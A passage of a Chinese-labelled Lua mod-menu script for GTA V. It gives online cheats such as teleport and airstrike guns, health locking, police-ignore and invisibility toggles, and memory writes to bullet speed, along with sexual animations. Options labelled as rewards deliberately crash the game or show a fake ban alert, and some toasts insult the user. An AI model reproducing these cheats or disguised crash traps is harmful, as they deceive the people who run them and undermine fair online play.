	ShootEffect.new("scr_rcbarry2", "muz_clown", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect.new("scr_rcbarry2", "scr_clown_bul", 0.3, v3.new(180.0, 0.0, 0.0))
}
local shootfire = "射击效果"
menu.toggle_loop(shejiqiangkou,shootfire, {"shootingfx"}, "", function ()
	local effect = shootingEffects[selectedOpt]
	if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)

	elseif PED.IS_PED_SHOOTING(players.user_ped()) then
		local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
		local boneId = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		CC_GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
			effect.name,
			weapon,
			0.0, 0.0, 0.0,
			effect.rotation.x, effect.rotation.y, effect.rotation.z,
			boneId,
			effect.scale,
			false, false, false
		)
	end
end)

local options_set <const> = {
	 "小丑符号枪",
	 "小丑花枪口"
}
local setshootfire = "设置射击枪口效果"
menu.slider_text(shejiqiangkou,setshootfire, {}, "", options_set, function (index)
	selectedOpt = index
end)
menu.toggle_loop(ziwowuqi, "空袭枪", {"airstrikegun"}, "射哪就空袭哪", function()
    kxq()
end)
menu.toggle_loop(ziwowuqi, "传送枪", {"tpgun"}, "射哪传哪", function()
    csq()
end)
menu.toggle(ziwowuqi, "女武神", {"valkrocket"}, "", function(toggle)
    nvwushen(toggle)
end)
menu.toggle_loop(ziwowuqi, "磁铁实体", {"magnetents"}, "射击两个实体以让它们互相吸引", function()
	ctst()
end, function ()
	counter = 0
	shotEntities = {}; entityPairs = {}
end)

local helpText = "射击车辆 生成随机颜色"

menu.toggle_loop(ziwowuqi,"彩蛋车枪", {"paintgun"}, helpText, function()
    caidancargun()
end)
menu.toggle_loop(ziwowuqi, "射出NPC", {""}, "随机NPC(威力很大)", function()
    shechuNPC()
end)
menu.toggle(ziwowuqi, "痛击队友", {}, "对队友展开攻击", function(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false) 
end)
local movement = menu.list(ziwowuqi, "战斗辅助")
local roll_speed = nil
menu.list_select(movement, "战斗翻滚速度", {}, "", {"默认", "1.25x", "1.5x", "1.75x", "2x"}, 1, function(index, value)
roll_speed = index
util.create_tick_handler(function()
    switch value do
        case "1.25x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 115, true)
            break
        case "1.5x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 125, true)
            break
        case "1.75x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 135, true)
            break
        case "2x":
            STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 150, true)
            break
        end
        return roll_speed == index
    end)
end)

local climb_speed = nil
menu.list_select(movement, "攀爬速度", {}, "", {"默认", "1.25x", "1.5x", "2x",}, 1, function(index, value)
climb_speed = index
util.create_tick_handler(function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 1) then
        switch value do
            case "1.25x":
                PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
                util.yield(150)
                break
            case "1.5x":
                PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
                util.yield(75)
                break
            case "2x":
                PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
                util.yield(25)
                break
            end
        end
        return climb_speed == index
    end)
end)

menu.toggle_loop(movement, "快速更换武器", {"fasthands"}, "武器更换速度更快.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(movement, "快速近战", {"fastmelee"}, "近战速度更快.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 130) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(movement, "快速攀爬", {"fastmount"}, "更快的攀爬一些东西\n例如：汽车、障碍物等.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 50) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 51) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)
local melee = menu.list(movement, "近战增强")
local modifier = 1.00
menu.slider_float(melee, "倍率调整", {"meleedamage"}, "", 100, 1000, 100, 10, function(value)
    modifier = value / 100
end)
---@class AmmoSpeed
local AmmoSpeed = {address = 0, defaultValue = 0}
AmmoSpeed.__index = AmmoSpeed

---@param address integer
---@return AmmoSpeed
function AmmoSpeed.new(address)
	assert(address ~= 0, "got a nullpointer")
	local instance = setmetatable({}, AmmoSpeed)
	instance.address = address
	instance.defaultValue = memory.read_float(address)
	return instance
end

AmmoSpeed.__eq = function (a, b)
	return a.address == b.address
end

---@return number
function AmmoSpeed:getValue()
	return memory.read_float(self.address)
end

---@param value number
function AmmoSpeed:setValue(value)
	memory.write_float(self.address, value)
end

function AmmoSpeed:reset()
	memory.write_float(self.address, self.defaultValue)
end

local multiplier
---@type AmmoSpeed
local modifiedSpeed
local helpText_speed <const> =
"允许你改变非瞬发子弹(火箭、烟火等)的速度"
local shootspeedxx = "子弹速度倍增"
menu.slider_float(movement,shootspeedxx, {"bulletspeedmult"}, helpText_speed, 10, 100000, 100, 10, function(value)
	multiplier = value / 100
end)

util.create_tick_handler(function()
	local CPed = entities.handle_to_pointer(players.user_ped())
	if CPed == 0 or not multiplier then return end
	local ammoSpeedAddress = addr_from_pointer_chain(CPed, {0x10B8, 0x20, 0x60, 0x58})
	if ammoSpeedAddress == 0 then
		if entities.get_user_vehicle_as_pointer() == 0 then return end
		ammoSpeedAddress = addr_from_pointer_chain(CPed, {0x10B8, 0x70, 0x60, 0x58})
		if ammoSpeedAddress == 0 then return end
	end
	local ammoSpeed = AmmoSpeed.new(ammoSpeedAddress)
	modifiedSpeed = modifiedSpeed or ammoSpeed
	if ammoSpeed ~= modifiedSpeed then
		modifiedSpeed:reset()
		modifiedSpeed = ammoSpeed
	end
	local newValue = modifiedSpeed.defaultValue * multiplier
	if modifiedSpeed:getValue() ~= newValue then
		modifiedSpeed:setValue(newValue)
	end
end)

util.on_stop(function ()
	if modifiedSpeed then modifiedSpeed:reset() end
end)
wuqibaocun = menu.list(ziwowuqi, '武器保存', {}, '')
    save_loadout = wuqibaocun:action("保存武器", {}, "保存所有当前装备的武器及其附件，以便将来装载", function()
        baocunwq()
    end)
    load_loadout = wuqibaocun:action("加载上次保存武器", {"loadloadout"}, "装备上次保存的每一件武器", function()
        jiazaiwq()
    end)
    auto_load = wuqibaocun:toggle("自动加载", {"loadweapon"}, "加入新战局时，自动装备上次保存的每件武器", function(on)
        zidongjz(on)
    end)
    from_scratch = wuqibaocun:action("从头开始", {}, "删除你当前的武器，这样你就可以按照你想要的方式构建你的装备",function()
        congtouks()
    end)
    wuqibaocun:divider("编辑武器")
    wancheng()
local lianhuanbao = menu.list(ziwowuqi, '连环爆破', {}, '')


---@diagnostic disable-next-line: undefined-global
mutually_exclusive_weapons[#mutually_exclusive_weapons + 1] = menu.mutually_exclusive_toggle(lianhuanbao, '连环爆炸RPG', {'JSnukeGun'}, '请使用RPG.', mutually_exclusive_weapons, function(toggle)
    lhbz(toggle)
    util.toast("请使用RPG！！！")
end)


menu.action(lianhuanbao, '标点轰炸', {'JSnukeWP'}, '.', function ()
    lhbj()
end)

---@diagnostic disable-next-line: undefined-global
menu.slider(lianhuanbao, '连环爆高度', {'JSnukeHeight'}, '设置高度.', 10, 100, nuke_height, 10, function(value)
    lhgd(value)
end)
local throwables = menu.list(ziwowuqi, '榴弹投掷器', {}, '')
---@diagnostic disable-next-line: undefined-global
mutually_exclusive_weapons[#mutually_exclusive_weapons + 1] = menu.mutually_exclusive_toggle(throwables, '榴弹投掷器', {'JSgrenade'}, '用榴弹炮发射所选类型的投掷物.', mutually_exclusive_weapons, function(toggle)
    throwablebullet(toggle)
end)


local throwables_launcher_list throwables_launcher_list = menu.list_action(throwables, '目前' ..': Grenade', {}, '', getLabelTableFromKeys(throwablesTable), function(index, text)
    menu.set_menu_name(throwables_launcher_list, '目前' ..': '.. text)
    bulletset(text)
end)
menu.toggle_loop(ziwowuqi, '翻滚换子弹', {}, '翻滚换弹', function()
    fghd()
    end)

    menu.toggle_loop(ziwowuqi, '冷兵器的威压', {}, '', function ()
        lbqwy()
    end)
    health = menu.list(self, "恢复选项", {}, "", function(); end)
menu.action(health, "补充血量", {"maxhealth"}, "", function()
	ENTITY.SET_ENTITY_HEALTH(players.user_ped(), PED.GET_PED_MAX_HEALTH(players.user_ped()), 0)
end)
menu.action(health, "补充护甲", {"maxarmour"}, "", function()
    if util.is_session_started() then
		PED.SET_PED_ARMOUR(players.user_ped(), 50)
	else
		PED.SET_PED_ARMOUR(players.user_ped(), 100)
	end
end)
menu.toggle_loop(health, '自动加血', {'JSfullRegen'}, '一直加血直到您的血被加满.', function()
    cq01()
    end)
    local toLockHealth = defaultHealth * 0.5
menu.toggle(health, "当血量过低时锁定", {}, "当血量低于设置的数值后，锁定血量（控制在80%以内）", function(toggle)
    islockHealth = toggle
    local localPed = PLAYER.PLAYER_PED_ID()
    local currentHealth
    util.create_tick_handler(function()
        if islockHealth then
            currentHealth = ENTITY.GET_ENTITY_HEALTH(localPed)
            if currentHealth < toLockHealth then
                ENTITY.SET_ENTITY_HEALTH(localPed, toLockHealth)
            end
        end
    end)
end)
lockHealthSlider = menu.slider(health, "低于多少%血量", { "rlockhealth" }, "锁定前到达的最低血量，单位%", 10, 100, 50, 10, function(value)
    local maxHealth = ENTITY.GET_ENTITY_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
    toLockHealth = maxHealth * value / 100
end)
    menu.toggle_loop(health, "在掩体后时补充生命值", {"healincover"}, "", function()
        healthincover()
    end, function ()
        PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(players.user(), 0.25)
        PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 1.0)
    end)
    zishen = menu.list(self, "自身选项", {}, "", function(); end)
    --Clean
    local country_flags = {"apa_prop_flag_argentina", "apa_prop_flag_australia", "apa_prop_flag_austria", "apa_prop_flag_belgium", "apa_prop_flag_brazil", "apa_prop_flag_canada_yt", "apa_prop_flag_china", "apa_prop_flag_columbia", "apa_prop_flag_croatia", "apa_prop_flag_czechrep", "apa_prop_flag_denmark", "apa_prop_flag_england", "apa_prop_flag_eu_yt", "apa_prop_flag_finland", "apa_prop_flag_france", "apa_prop_flag_german_yt", "apa_prop_flag_hungary", "apa_prop_flag_ireland", "apa_prop_flag_israel", "apa_prop_flag_italy", "apa_prop_flag_jamaica", "apa_prop_flag_japan_yt", "apa_prop_flag_lstein", "apa_prop_flag_malta", "apa_prop_flag_mexico_yt", "apa_prop_flag_netherlands", "apa_prop_flag_newzealand", "apa_prop_flag_nigeria", "apa_prop_flag_norway", "apa_prop_flag_palestine", "apa_prop_flag_poland", "apa_prop_flag_portugal", "apa_prop_flag_puertorico", "apa_prop_flag_russia_yt", "apa_prop_flag_scotland_yt", "apa_prop_flag_script", "apa_prop_flag_slovakia", "apa_prop_flag_slovenia", "apa_prop_flag_southafrica", "apa_prop_flag_southkorea", "apa_prop_flag_spain", "apa_prop_flag_sweden", "apa_prop_flag_switzerland", "apa_prop_flag_turkey", "apa_prop_flag_uk_yt", "apa_prop_flag_us_yt", "apa_prop_flag_wales"}
local flags_fmt = {}
for _, flag in pairs(country_flags) do 
    table.insert(flags_fmt, first_to_upper(flag:gsub('apa_prop_flag_', ''):gsub('_yt', '')))
end

menu.list_action(zishen,"附加国旗", {"attachflagtocar"}, "", flags_fmt, function(index, val)
    if player_cur_car ~= 0 then 
        local hash = util.joaat(country_flags[index])
        request_model_load(hash)
        local flag = entities.create_object(hash, players.get_position(players.user()))
        local ht = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car)).z
        ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, player_cur_car, 0, 0, 0, ht, 0, 0, 0, true, false, false, false, 0, true)
    end
end)
menu.action(zishen, "清理自身", {"cleanself"}, "清理自身.",
function()
    PED.CLEAR_PED_BLOOD_DAMAGE(players.user_ped())
    announce("清理完成.")
end
)
menu.toggle(zishen, "循环清理自身", {}, "循环清理自身.", function(state) local is_on = state if state then announce("清理自身.") end while is_on do PED.CLEAR_PED_BLOOD_DAMAGE(players.user_ped()) util.yield() end end)

    menu.toggle_loop(zishen, "锁定等级", {}, "将你的等级锁定在0喲，又可以装萌新了！", function()
        util.set_local_player_wanted_level(0)
        util.toast("装你妈萌新 操你妈的 臭傻逼！")
        end)
    menu.toggle_loop(zishen, '夜总会人气', {'ncmax'}, '将夜总会人气保持在最高值', function ()
        if util.is_session_started() then
            local ncpop = math.floor(STAT_GET_INT('CLUB_POPULARITY') / 10)
            if ncpop < 100 then
                menu.trigger_commands('clubpopularity 100')
                util.yield(250)
            end
        end
    
    end)
    pickups_thread = util.create_thread(function(thr)
        while true do
            if pickup_uses > 0 then
                ls_log("Pickups pool is being updated")
                all_pickups = entities.get_all_pickups_as_handles()
                for k,p in pairs(all_pickups) do
                    if tp_all_pickups then
                        local pos = ENTITY.GET_ENTITY_COORDS(tp_pickup_tar, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(p, pos['x'], pos['y'], pos['z'], true, false, false)
                    end
                end
            end
            util.yield()
        end
    end)
    tp_all_pickups = false
tp_pickup_tar = players.user_ped()
menu.toggle(zishen,"传送所有拾取物", {},"将所有拾取物传送给你", function(on)
    tp_all_pickups = on
    mod_uses("pickup", if on then 1 else -1)
end)
    menu.toggle_loop(zishen, "自动索赔载具", {}, "自动索赔被摧毁的载具.", function()
        autogetcar()
    end)
    menu.toggle(zishen, "幽灵模式", {"andyghostmode"}, "同时切换多个看台功能，如“隐身”和“关闭雷达”，使您完全隐身.",
    function(state)
        menu.trigger_command(menu.ref_by_path("Self>Appearance>Invisibility>" .. (state and "Enabled" or "Disabled"), 38))
        menu.set_value(menu.ref_by_path("Online>Off The Radar", 38), state)
        announce("幽灵模式 " .. (state and "On" or "Off"))
    end
    )

    menu.toggle(zishen, "遨游空中",{""}, "可在空中游泳",function(on)
        if on then
            menu.trigger_commands("swiminair on")
        else
            menu.trigger_commands("swiminair off")
        end
    end)
    local togglestate = false

    menu.toggle(zishen, "平稳掉落", {}, "无论多高掉落都不会摔死", function(toggle)
        pwdl(toggle)
    end)

    menu.toggle_loop(zishen, "警察无视", {}, "", function(toggle)
        PLAYER.SET_POLICE_IGNORE_PLAYER(PLAYER.PLAYER_ID(), toggle)
    end)
    menu.slider(zishen, "人物透明度", {"transparency"}, "", 0, 100, 100, 20, function(value)
        if value > 80 then
            ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
        else
            ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
        end
    end)
    
    menu.toggle(zishen, "禁用脚步声", {"disablefootsteps"}, "", function(state)
        AUDIO._SET_PED_AUDIO_FOOTSTEP_LOUD(players.user_ped(), not state)
    end)
    menu.divider(self, "娱乐选项")
    dzjb = menu.list(self, "动作选项", {}, "", function(); end)
    tzdzjb = menu.action(dzjb, "加载动作选项", {""}, "", function()
        notification("正在加载动作脚本,请稍等",colors.green)
        util.yield(2000)
        require "lib.cqcqlib.Dongzuoscript"
        menu.delete(tzdzjb)
    end)
    ChangjingAction = menu.list(self, "场景动画", {}, "加载场景动画", function(); end)
Load_ChangjingAction = menu.action(ChangjingAction, "加载场景动画选项", {""}, "", function()
        notification("正在加载场景动画脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.cqcqlib.ChangjingAction"
        menu.delete(Load_ChangjingAction)
    end)
    KinkScript = menu.list(self, "色魔选项", {}, "加载色魔选项", function(); end)
Load_KinkScript = menu.action(KinkScript, "加载色魔选项选项", {""}, "", function()
        notification("正在加载色魔选项脚本,请稍等",colors.green)
        util.yield(2000)
        require "lib.cqcqlib.KinkScript"
        menu.delete(Load_KinkScript)
    end)
    anims_root = menu.list(self, "涩涩动作", {"sexluaanims"}, "")
    menu.action(anims_root, "停止所有动画", {"sexstopanims"}, "", function(on_click)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
end)
anims_nroot = menu.list(anims_root, "自我动作", {"sexanimsnormal"}, "")
anims_nroot_self = menu.list(anims_nroot, "自己", {"sexanimsnormalself"}, "")
anims_nroot_receiver = menu.list(anims_nroot, "接受者", {"sexanimsnormalreceiver"}, "")
anims_nroot_giver = menu.list(anims_nroot, "给予者", {"sexanimsnormalgiver"}, "")
menu.action(anims_nroot_self, "打管子", {"sexanimmasturbation"}, "", function(on_click)
    play_anim("switch@trevor@jerking_off", "trev_jerking_off_loop", -1)
end)
menu.action(anims_nroot_giver, "后入", {"sexanimnanalg"}, "", function(on_click)
    play_anim("rcmpaparazzo_2", "shag_loop_a", -1)
end)

menu.action(anims_nroot_receiver, "被后入", {"sexanimnanalr"}, "", function(on_click)
    play_anim("rcmpaparazzo_2", "shag_loop_poppy", -1)
end)
anims_vroot = menu.list(anims_root, "车上暧昧动作", {"sexanimsveh"}, "")
anims_vroot_receiver = menu.list(anims_vroot, "承受", {"sexanimsvehreceiver"}, "")
anims_vroot_giver = menu.list(anims_vroot, "出击", {"sexanimsvehgiver"}, "")
menu.action(anims_vroot_receiver, "摁头口", {"sexanimcarblowjobr"}, "", function(on_click)
    play_anim("mini@prostitutes@sexlow_veh", "low_car_bj_loop_player", -1)
end)

menu.action(anims_vroot_giver, "跪着口", {"sexanimcarblowjobg"}, "", function(on_click)
    play_anim("mini@prostitutes@sexlow_veh", "low_car_bj_loop_female", -1)
end)

menu.action(anims_vroot_receiver, "摸头口", {"sexanimcarsexr"}, "", function(on_click)
    play_anim("mini@prostitutes@sexlow_veh", "low_car_sex_loop_player", -1)
end)

menu.action(anims_vroot_giver, "坐着抽插", {"sexanimcarsexg"}, "", function(on_click)
    play_anim("mini@prostitutes@sexlow_veh", "low_car_sex_loop_female", -1)
end)
dances_root = menu.list(anims_root, "膝上舞蹈", {"sexanimslapdance"}, "")
menu.action(dances_root, "拉普丹斯1", {"sexanimlapdance1"}, "", function(on_click)
    play_anim("mini@strip_club@private_dance@part1", "priv_dance_p1", -1)
end)

menu.action(dances_root, "拉普丹斯2", {"sexanimlapdance1"}, "", function(on_click)
    play_anim("mini@strip_club@private_dance@part2", "priv_dance_p2", -1)
end)

menu.action(dances_root, "拉普丹斯3", {"sexanimlapdance1"}, "", function(on_click)
    play_anim("mini@strip_club@private_dance@part3", "priv_dance_p3", -1)
end)
gangguanwu = menu.list(anims_root, "钢管舞", {"sexanimspoledance"}, "")
menu.action(gangguanwu, "钢管舞1", {"sexanimpoledance1"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_a_2_stage", "pole_a_2_stage", -1)
end)
menu.action(gangguanwu, "钢管舞2", {"sexanimpoledance2"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_b_2_stage", "pole_b_2_stage", -1)
end)


menu.action(gangguanwu, "钢管舞3", {"sexanimpoledance3"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_c_2_prvd_a", "pole_c_2_prvd_a", -1)
end)


menu.action(gangguanwu, "钢管舞4", {"sexanimpoledance4"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_c_2_prvd_b", "pole_c_2_prvd_b", -1)
end)

menu.action(gangguanwu, "钢管舞5", {"sexanimpoledance5"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_c_2_prvd_c", "pole_c_2_prvd_c", -1)
end)


menu.action(gangguanwu, "钢管舞6", {"sexanimpoledance6"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_c_2_stage", "pole_c_2_stage", -1)
end)


menu.action(gangguanwu, "钢管舞7", {"sexanimpoledance7"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_dance1", "pd_dance_01", -1)
end)

menu.action(gangguanwu, "钢管舞8", {"sexanimpoledance8"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_dance2", "pd_dance_02", -1)
end)

menu.action(gangguanwu, "钢管舞9", {"sexanimpoledance9"}, "", function(on_click)
    play_anim("mini@strip_club@pole_dance@pole_dance3", "pd_dance_03", -1)
end)
self01 = menu.list(self, "玩物选项", {}, "", function(); end)
menu.action(self01, "吊射炮", {"从吊里发射一枚火炮"}, "", function ()
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    diaoshepao(ptfx_asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, players.user_ped(), 0.0, 0.0, -0.3, 90.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0)
    for i=1, 10 do 
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, i, 0.0)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 67, 0.0, false, false, 0.0, true)
    end
end)
menu.action(self01, '一键雪球', {}, '获得雪球！', function ()
    yijianxueqiu()
end)
    
menu.action(self01, '一键烟花发射器', {}, '获得烟花发射器', function ()
    yijianyanhua()
end)
menu.action(self01,"生成多米诺骨牌", {"spawndominoes"}, "", function()
    local hash = util.joaat("prop_boogieboard_01")
    request_model_load(hash)
    local last_ent = players.user_ped()
    for i=2, 25 do 
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_ent, 0, -i, 0)
        local d = entities.create_object(hash, c)
        ENTITY.SET_ENTITY_HEADING(d, ENTITY.GET_ENTITY_HEADING(last_ent))
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(d)
    end
end)
menu.action(self01, "警察", {}, "成为一名人民警察，惩恶扬善", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user_ped())
    PED.SET_PED_AS_COP(p, true)
    menu.trigger_commands("smycop01") --model cop
    menu.trigger_commands("police3") --spawn cop car
end)
menu.toggle(self01, "骑牛", {}, "骑上大牛.",
    function(state)
       qiniu(state)
    end)
local bones <const> = {
    0x49D9,	
    0xDEAD,	
    0x3779,	
    0xCC4D	
}
local colour = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}
local timer <const> = newTimer()
local trailsOpt <const> = menu.list(self01,"轨迹"), {}, ""
local effect <const> = Effect.new("scr_rcpaparazzo1", "scr_mich4_firework_sparkle_spawn")
local effects = {}
menu.toggle_loop(trailsOpt,"轨迹", {"trails"}, "", function ()
    if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
		return
	end
	if timer.elapsed() >= 1000 then
		removeFxs(effects); effects = {}
		timer.reset()
	end
	if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
		local minimum, maximum = v3.new(), v3.new()
		MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)
		local offsets <const> = {v3(minimum.x, minimum.y, 0.0), v3(maximum.x, minimum.y, 0.0)}
		for _, offset in ipairs(offsets) do
			GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
			local fx =
			GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(
				effect.name,
				vehicle,
				offset.x,
				offset.y,
				0.0,
				0.0,
				0.0,
				0.0,
				0.7, --scale
				false, false, false,
				0, 0, 0, 0
			)
			GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)
			table.insert(effects, fx)
		end
	elseif ENTITY.DOES_ENTITY_EXIST(players.user_ped()) then
		for _, boneId in ipairs(bones) do
			GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
			local fx =
			GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
				effect.name,
				players.user_ped(),
				0.0,
				0.0,
				0.0,
				0.0,
				0.0,
				0.0,
				PED.GET_PED_BONE_INDEX(players.user_ped(), boneId),
				0.7, --scale
				false, false, false,
				0, 0, 0, 0
			)
			GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)
			table.insert(effects, fx)
		end
	end
end, function ()
	removeFxs(effects); effects = {}
end)
local trailColour = menu.colour(trailsOpt,"颜色", {"trailcolour"}, "",
	colour, false, function(newColour) colour = newColour end)
menu.rainbow(trailColour)
self02 = menu.list(self, "白嫖选项", {}, "", function(); end)
phrases = {"勇者按下去", "你被宠坏了，不是吗？", "你为什么这么做？", "我是说。。。", "这是浪费时间，不是吗？", "想想看。", "我叫你不要这样做。。", "但是你还在做。", "...", "我不知道你期望发生什么。", "这不会给你一百万美元。", "这不会让你找到灵魂伴侣。", "你 想 要 一个灵魂伴侣，对吗？", "我知道事情会变得孤独。。", "我知道", "我们可以拥抱它。", "只有当你停止按这个，就是。", "请停下来。", "我很客气地问。", "你想让我哭吗？", "这就是你想要的吗？", "你疯了。", "真是个蛇精病。", "你在这里浪费了多少时间？", "错误", "我直截了当地说是错误", "那没骗到你吗？", "你知道吗？", "我受够了。", "如果你一直点击这个", "一个贫穷国家的孩子现在就要死了。", "从现在开始。", "下次单击时，它会发生。", "哇，你没有道德，是吗？", "1名儿童死亡。", "都是因为你。", "我们他妈的杀了他。", "是的。", "他的生命掌握在你手中。", "你决定把它扔掉。", "真可怜。", "你知道吗？你赢了。", "你是坨狗屎。", "混蛋。", "好的", "随你的便", "再见"}
lastid = self02
for k,p in pairs(phrases) do
    lastid = menu.list(lastid, p, {}, "")
end
	menu.action(lastid,"恭喜", {}, "你会后悔的", function(on_click)
    show_custom_alert_until_enter("您已被永久禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
	util.yield(500)
	menu.trigger_commands("quittosp")
end)
menu.action(self02, "获得26岁少妇一个", {}, "少妇哦，不要白不要:)", function()
    ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0)
    util.toast("等下就死机:)")
end)
menu.click_slider(self02, "获得绝版服装", {"Click me"}, "点1没反应点到2获得绝版服装", 1, 2, 1, 1, function(on_change)
	if on_change == 1 then	
	menu.trigger_commands("yeet")
	end
	if on_change == 2 then
    STREAMING.REQUEST_MODEL(-1364166376)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local cone = OBJECT.CREATE_OBJECT_NO_OFFSET(-1364166376, c.x, c.y, c.z, true, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cone, cone, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
	end
end)
local firebreath = menu.list(self01, '喷火', {}, '')
    menu.toggle(firebreath, '喷火', {'JSfireBreath'}, '', function(toggle)
        firebreathxxx(toggle)
    end)
    menu.slider(firebreath, '喷火比例', {'JSfireBreathScale'}, '', 1, 100, fireBreathSettings.scale * 10, 1, function(value)
        firebreathscale(value)
    end)
    menu.rainbow(menu.colour(firebreath, '喷火颜色', {'JSfireBreathColour'}, '', fireBreathSettings.colour, false, function(colour)
        firebreathcolour(colour)
    end))
menu.list_action(self01, "获取屌", {}, "选择屌", opt_pp, function(index, value, click_type)
    cq02(index, value, click_type)
    end)
    local _LR = menu.list(self01, '获得翅膀', {}, '')
    menu.toggle(_LR, '翅膀', {'JSfireWings'}, '火焰翅膀.', function (toggle)
        firewing(toggle)
    end)
    menu.slider(_LR, '翅膀比例', {'JSfireWingsScale'}, '', 1, 100, 3, 1, function(value)
        firewingscale(value)
    end)
    menu.rainbow(menu.colour(_LR, '翅膀颜色', {'JSfireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)
        firewingcolour(colour)
    end))--===========================再看死妈妈  狗白
    self03 = menu.list(self01, "生成加速垫", {}, "", function(); end)
    menu.action(self03, "加速垫", {}, "在你面前生一个绿绿的加速垫", function() 
        jiasudian()
    end)
    
    menu.action(self03, "四个个加速垫", {}, "在你面前生成4个加速垫", function()
        sigejiasudian()
    end) 
menu.divider(self, "其他")
local window_x = 0.01
local window_y = 0.03
local text_margin = 0.003
local text_height = 0.018 
local window_width = 0.12
local window_height = 0.2
local menu_items = {
    "从前从前",
    "他的CqCqscript",
    "是世界上最牛逼的脚本",
    "Welcome to my",
    "qq群",
    "198651882"
   
}
local selected_index = 0

local blur_rect_instance

local function colour(r, g, b, a)
    return { 
        r = r / 255,
        g = g / 255,
        b = b / 255,
        a = a / 255
    }
end

local function gui_background(x, y, width, height, blur_radius)
    local background = colour(10, 0, 10, 100)
    local border_color_left = colour(255, 0, 255, 255)
    local border_color_right = colour(0, 0, 0, 255)
    directx.blurrect_draw(
        blur_rect_instance, 
        x, y, width, height,
        blur_radius or 5
    )
    directx.draw_rect(
        x, y,
        width, height,
        background
    )
    directx.draw_line(
        x, y,
        x, y + height,
        border_color_left
    )
    directx.draw_line(
        x, y,
        x + width, y,
        border_color_left, border_color_right
    )
    directx.draw_line(
        x + width, y,
        x + width, y + height,
        border_color_right
    )
    directx.draw_line(
        x, y + height,
